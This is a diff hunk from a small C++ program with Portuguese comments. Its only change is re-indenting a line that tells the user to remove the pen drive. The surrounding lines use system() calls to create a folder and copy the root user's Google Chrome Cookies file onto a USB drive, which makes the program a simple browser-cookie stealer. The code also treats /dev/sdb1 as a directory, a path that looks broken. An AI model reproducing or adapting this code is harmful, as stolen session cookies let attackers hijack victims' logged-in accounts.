@@ -21,6 +21,6 @@ int main(){
 //
 	system("mkdir /dev/sdb1/Google-Chrome"); // cria uma pasta para onde os arquivos copiados serao copiados
 	system("cp /root/.config/google-chrome/Default/Cookies /dev/sdb1/Google-Chrome"); // copia tds os arquivo do google-chrome para o pendriver.
-  cout << "REMOVA O PENDRIVER !!!" << endl; // amostra na tela do usuario para remover o pendriver .
+        cout << "REMOVA O PENDRIVER !!!" << endl; // amostra na tela do usuario para remover o pendriver .
   
 }
